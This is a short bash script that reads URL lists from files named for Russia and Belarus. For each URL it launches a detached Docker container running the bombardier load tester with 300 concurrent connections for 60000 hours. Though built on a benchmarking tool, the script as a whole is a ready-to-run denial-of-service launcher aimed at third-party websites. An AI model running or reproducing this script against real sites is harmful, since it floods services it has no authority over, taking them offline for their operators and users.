#!/bin/bash
RESOURCES_RU="./resources/ru.txt"

if test -f "$RESOURCES_RU";
then
    echo "File: $RESOURCES_RU - exists."
else
    echo "File: $RESOURCES_RU - does not exists!!!"
    exit
fi

IFS=$'\n' read -d '' -r -a lines < $RESOURCES_RU

for i in "${lines[@]}"
do
   echo "$i"
   export URL=$i
   docker run --platform linux/amd64 -d alpine/bombardier -c 300 -d 60000h -l $URL
done



RESOURCES_BY="./resources/by.txt"

if test -f "$RESOURCES_BY";
then
    echo "File: $RESOURCES_BY - exists."
else
    echo "File: $RESOURCES_BY - does not exists!!!"
    exit
fi

IFS=$'\n' read -d '' -r -a lines < $RESOURCES_BY

for i in "${lines[@]}"
do
   echo "$i"
   export URL=$i
   docker run --platform linux/amd64 -d alpine/bombardier -c 300 -d 60000h -l $URL
done
